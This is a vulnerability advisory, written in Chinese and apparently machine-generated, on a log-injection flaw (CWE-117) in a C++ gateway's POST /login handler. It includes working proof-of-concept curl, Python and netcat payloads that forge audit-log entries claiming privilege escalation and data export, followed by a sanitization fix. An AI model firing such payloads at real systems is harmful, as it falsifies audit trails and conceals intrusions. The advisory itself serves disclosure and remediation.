# VULN-DF-CPP-LOGI-AUTH-001: POST /login 请求体未过滤直接写入审计日志导致日志注入伪造

**严重性**: High | **CWE**: CWE-117 (Improper Output Neutralization for Logs) | **置信度**: 85/100
**位置**: `src/main.cpp:43` @ `main::<lambda>(POST /login)`
**语言/框架**: C++ / posix_sockets
**分析类型**: dataflow
**Source/Sink**: network → file_write
**规则/证据来源**: c_cpp.log.injection.unsanitized / llm

---

## 1. 漏洞细节

POST `/login` 路由处理器将用户可控的 HTTP 请求体（`request.body`）直接作为 `detail` 参数传递给 `AuditLog::event()` 函数，未经任何清洗、转义或换行符过滤。`AuditLog::event()` 内部使用 `std::ofstream` 的 `operator<<` 将所有参数原样写入审计日志文件 `edge-gateway.audit.log`。

攻击者可以在 POST 请求体中注入换行符（`\n` 或 `\r\n`），随后跟随精心构造的伪日志条目。由于日志文件采用追加模式写入且每行以 `\n` 结尾，注入的换行符会被日志解析器视为合法的行分隔符，从而使伪造内容被当作真实审计记录。

**注意**：`username` 向量由于 `operator>>` 的空白符分隔机制（`\n` 和 `\r` 在 C locale 中属于空白符），实际上**不可利用**。只有 `request.body` 向量是**完全可利用**的。

### 证据摘要

- **触发源**: network（通过 `recv()` 接收的 HTTP POST 请求体）
- **危险点**: file_write（`std::ofstream operator<<` 写入审计日志文件）
- **已检查的清洗/缓解**: 无。对整个代码库进行了 `sanitiz|escape|replace|newline|encode|clean|filter|strip` 关键词搜索，未发现任何清洗逻辑
- **关键证据**:
  - `stream.rdbuf()` 在 `http_server.cpp:66` 读取头部之后的所有剩余内容，无任何过滤
  - `request.body` 在 `main.cpp:43` 直接传递给 `audit.event()` 的 `detail` 参数
  - `audit_log.hpp:12-14` 使用 `operator<<` 原样写入 `ofstream`，无转义处理
  - `AuditLog` 构造函数以 `std::ios::app`（追加模式）打开文件，每条记录以 `\n` 结尾

## 2. 漏洞代码

### 漏洞触发点 — 登录处理器

**文件**: `src/main.cpp` (行 40-52)

```cpp
server.route("POST", "/login", [&](const HttpRequest& request) {
    std::string username = queryValue(request, "user");
    std::string password = queryValue(request, "password");
    audit.event(username, "login-attempt", request.body);  // ← 第43行: request.body 直接传入，未清洗

    if (!users.authenticate(username, password)) {
      return text(401, "invalid credentials\n");
    }

    std::string token = users.issueSession(username);
    audit.event(username, "login-success", token);
    return text(200, "session=" + token + "\n");
});
```

**分析**: 第 43 行是核心漏洞点。`request.body` 包含原始 HTTP POST 请求体，可含有任意字符（包括 `\n`），被直接传递给 `audit.event()` 作为 `detail` 参数。

### 最终 Sink — 审计日志写入

**文件**: `include/audit_log.hpp` (行 7-18)

```cpp
class AuditLog {
 public:
  explicit AuditLog(const std::string& path) : out_(path, std::ios::app) {}  // 追加模式

  void event(const std::string& user, const std::string& action, const std::string& detail) {
    out_ << std::time(nullptr) << " user=" << user       // ← 原样写入
         << " action=" << action
         << " detail=" << detail << "\n";                 // ← detail 含 \n 时产生伪造行
  }

 private:
  std::ofstream out_;
};
```

**分析**: `event()` 函数将 `user`、`action`、`detail` 三个参数通过 `operator<<` 直接写入 `ofstream`，没有任何换行符转义、URL 编码或其他清洗操作。当 `detail` 包含 `\n` 时，`\n` 之后的内容会出现在新的一行，被日志解析器视为独立的日志条目。

### Body 解析 — 无过滤读取

**文件**: `src/http_server.cpp` (行 42-69)

```cpp
HttpRequest HttpServer::parseRequest(const std::string& raw) const {
  HttpRequest request;
  std::istringstream stream(raw);
  std::string target;

  stream >> request.method >> target;         // 行47: operator>> 遇空白符停止（username 屏障）
  // ... query 解析和 header 解析 ...

  std::ostringstream body;
  body << stream.rdbuf();                     // 行66: 读取所有剩余内容，包括 \n
  request.body = body.str();                  // 行67: 原样存储
  return request;
}
```

**分析**: 第 66 行的 `stream.rdbuf()` 将 HTTP 头部之后的所有剩余流内容读入 `body`，不做任何字符过滤或 Content-Length 校验。POST 请求体中的 `\n` 字符被完整保留。

## 3. 完整攻击链路

```
[入口点] recv()@src/http_server.cpp:113
  ↓ 原始 HTTP 数据从网络套接字读入 buffer[4096]
[解析] parseRequest(buffer)@src/http_server.cpp:119
  ↓ HTTP 请求被解析为 HttpRequest 结构体
[Body 提取] body << stream.rdbuf()@src/http_server.cpp:66
  ↓ 头部之后所有剩余内容原样读入 request.body，包括 \n 字符
[路由分发] handler->second(request)@src/http_server.cpp:127
  ↓ 完整 HttpRequest 结构体（含 body）以 const 引用传递给 login handler
[处理器] POST /login lambda@src/main.cpp:40
  ↓ request.body 直接作为第三参数传递
[Sink 调用] audit.event(username, "login-attempt", request.body)@src/main.cpp:43
  ↓ request.body 绑定到 detail 参数 (const std::string&)
[最终写入] out_ << ... << detail << "\n"@include/audit_log.hpp:14
  ↓ detail 中的 \n 导致换行，后续内容成为伪造日志条目
[日志文件] edge-gateway.audit.log (追加模式)
```

**链路可达性验证**:

1. **recv() → parseRequest()**: `http_server.cpp:119` 直接将 recv 缓冲区内容构造为 `std::string` 传入 `parseRequest()`，无条件可达
2. **parseRequest() → body**: `stream.rdbuf()` 在行 66 无条件执行，只要 HTTP 头部解析完成（遇到空行 `\r`），body 就会被读取
3. **handler 分发**: `http_server.cpp:127` 通过路由表查找，POST `/login` 路由在 `main.cpp:40` 注册，无条件可达
4. **audit.event() 调用**: `main.cpp:43` 位于 handler 的第一行逻辑，在任何认证检查之前执行，无条件可达
5. **ofstream 写入**: `audit_log.hpp:12-14` 直接执行 `operator<<`，无任何条件分支

**全链路无任何清洗、过滤或阻断点。**

## 4. 攻击场景

**攻击者画像**: 远程未认证用户。任何能够访问目标服务器 HTTP 端口的网络攻击者均可发起攻击，无需任何身份认证或特殊权限。

**攻击向量**: 通过 TCP 网络连接发送特制的 HTTP POST 请求到 `/login` 端点，在请求体中注入包含换行符的恶意内容。

**利用难度**: 低

### 攻击步骤

1. **识别目标**: 确定目标服务器 IP 和端口（默认 8080）
2. **构造恶意请求**: 创建 HTTP POST 请求，在请求体中嵌入换行符和伪造的日志条目
3. **发送请求**: 使用 `curl`、`nc` 或自定义脚本向 `POST /login` 发送恶意请求
4. **日志污染**: 服务器将恶意请求体原样写入 `edge-gateway.audit.log`，注入的换行符创建伪造的日志行
5. **审计欺骗**: 伪造的日志条目可用来：
   - 掩盖真实攻击痕迹
   - 伪造管理员操作记录（如权限提升）
   - 误导安全审计人员和自动化日志分析系统
   - 注入虚假的时间线事件

## 5. 攻击条件

| 条件类型 | 要求 | 说明 |
| -------- | ---- | ---- |
| 网络可达性 | 需要能访问目标 HTTP 端口 | 服务器默认监听 8080 端口（`INADDR_ANY`），攻击者需能建立 TCP 连接 |
| 认证要求 | 无需认证 | `audit.event()` 在 `users.authenticate()` 之前调用（main.cpp:43 vs 45），即使认证失败也会写入日志 |
| 配置依赖 | 无特殊配置要求 | 日志文件路径硬编码为 `edge-gateway.audit.log`，追加模式始终启用 |
| 环境依赖 | 无特殊环境要求 | 标准 POSIX socket 环境，任何支持 C++ 标准库的平台均可触发 |
| 时序条件 | 无时序要求 | 每次 POST /login 请求都会无条件触发日志写入 |

## 6. 造成影响

| 影响维度 | 等级 | 说明 |
| -------- | ---- | ---- |
| 机密性 | 低 | 日志注入本身不直接泄露数据，但伪造的日志可能掩盖其他信息窃取行为 |
| 完整性 | 高 | 审计日志的完整性被完全破坏。攻击者可注入任意伪造条目，篡改审计轨迹，使日志失去作为法律/合规证据的可信性 |
| 可用性 | 低 | 大量注入可能导致日志文件膨胀，但不直接导致服务中断 |

**影响范围**: 主要影响审计日志的完整性和可信度。在合规性要求严格的场景（如金融、医疗、政府系统）中，审计日志被篡改可能导致严重的安全治理失败。攻击者可以：

- 伪造管理员操作记录（如 `action=privilege-escalation`）
- 注入虚假的登录成功记录，混淆真实攻击时间线
- 在合法日志条目之间插入干扰信息，阻碍取证分析
- 如果日志被 SIEM 系统消费，可能触发误报或掩盖真实告警

## 7. PoC (概念验证)

> ⚠️ 以下 PoC 仅供安全测试和验证使用，请在授权范围内使用

### PoC 1: 使用 curl 注入伪造日志条目

```bash
# 发送 POST 请求，请求体中包含换行符和伪造的日志条目
curl -X POST "http://TARGET:8080/login?user=victim&password=wrong" \
  -d $'normal-body-content\n1750000000 user=attacker action=privilege-escalation detail=forged-admin-access'
```

**预期日志输出** (`edge-gateway.audit.log`):

```
1750200000 user=victim action=login-attempt detail=normal-body-content
1750000000 user=attacker action=privilege-escalation detail=forged-admin-access
```

第二行是攻击者注入的伪造日志条目，格式与合法条目完全一致。

### PoC 2: 使用 Python 脚本进行精确控制

```python
#!/usr/bin/env python3
"""日志注入 PoC - 仅供安全测试使用"""
import socket

TARGET = "127.0.0.1"
PORT = 8080

# 构造恶意请求体：正常内容 + 换行 + 伪造日志条目
malicious_body = (
    "innocent-login-data"
    "\n"
    "1750000000 user=attacker action=admin-grant detail=privilege-escalation-success"
    "\n"
    "1750000001 user=attacker action=data-export detail=exfiltrated-customer-db"
)

# 构造原始 HTTP 请求
request = (
    f"POST /login?user=testuser&password=test HTTP/1.1\r\n"
    f"Host: {TARGET}:{PORT}\r\n"
    f"Content-Type: application/x-www-form-urlencoded\r\n"
    f"Content-Length: {len(malicious_body)}\r\n"
    f"\r\n"
    f"{malicious_body}"
)

# 发送请求
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((TARGET, PORT))
sock.sendall(request.encode())
response = sock.recv(4096).decode()
sock.close()

print(f"[*] 响应: {response.split(chr(13))[0]}")
print(f"[*] 检查 edge-gateway.audit.log 确认注入结果")
```

### PoC 3: 使用 netcat 进行原始注入

```bash
# 使用 netcat 发送原始 HTTP 请求
printf 'POST /login?user=alice&password=wrong HTTP/1.1\r\nHost: localhost\r\nContent-Length: 99\r\n\r\nclean-data\n9999999999 user=hacker action=sudo-exec detail=root-shell-obtained' | nc TARGET 8080
```

**使用说明**: 
1. 确保目标服务器正在运行并监听指定端口
2. 执行 PoC 脚本或命令
3. 检查服务器上的 `edge-gateway.audit.log` 文件
4. 确认伪造的日志条目已出现在日志中，格式与合法条目一致

**预期结果**: `edge-gateway.audit.log` 中将出现攻击者注入的伪造日志条目，其格式与正常审计记录完全一致（`timestamp user=X action=Y detail=Z`），无法通过格式检查区分真伪。

## 8. 验证环境搭建

### 基础环境

- **操作系统**: Linux (Ubuntu 20.04+ / Debian 11+ / 任何支持 POSIX socket 的系统)
- **编译器**: g++ 9+ 或 clang++ 10+（需支持 C++17）
- **依赖**: 仅标准 C++ 库和 POSIX 系统调用，无外部依赖

### 构建步骤

```bash
# 假设项目根目录包含 CMakeLists.txt 或 Makefile
# 使用项目自带的构建系统编译
cd /path/to/project
mkdir -p build && cd build
cmake .. && make -j$(nproc)

# 或直接编译（如果没有构建系统）
g++ -std=c++17 -o edge-gateway \
  src/main.cpp \
  src/http_server.cpp \
  src/user_store.cpp \
  src/file_cache.cpp \
  src/diagnostics.cpp \
  -I include/
```

### 运行配置

```bash
# 启动服务器（默认端口 8080，可通过命令行参数指定）
./edge-gateway 8080

# 服务器启动后输出:
# edge-gateway listening on port 8080
```

无需额外配置文件。审计日志文件 `edge-gateway.audit.log` 会在首次写入时自动创建。

### 验证步骤

1. 启动 edge-gateway 服务器
2. 使用 PoC 1 的 curl 命令发送包含换行符的 POST 请求
3. 查看 `edge-gateway.audit.log` 文件内容：
   ```bash
   cat edge-gateway.audit.log
   ```
4. 确认日志中出现伪造的条目行

### 预期结果

**正常日志条目格式**:
```
{timestamp} user={username} action=login-attempt detail={body}
```

**注入后的日志文件**:
```
1750200000 user=victim action=login-attempt detail=innocent-body-content
1750000000 user=attacker action=privilege-escalation detail=forged-admin-access
```

第二行为攻击者注入的伪造条目，与合法条目格式完全一致，无法通过简单的格式校验识别。

### 修复建议

在 `AuditLog::event()` 中对所有参数进行换行符转义：

```cpp
void event(const std::string& user, const std::string& action, const std::string& detail) {
    auto sanitize = [](const std::string& s) {
        std::string result;
        result.reserve(s.size());
        for (char c : s) {
            if (c == '\n') result += "\\n";
            else if (c == '\r') result += "\\r";
            else result += c;
        }
        return result;
    };
    out_ << std::time(nullptr) << " user=" << sanitize(user)
         << " action=" << sanitize(action)
         << " detail=" << sanitize(detail) << "\n";
}
```
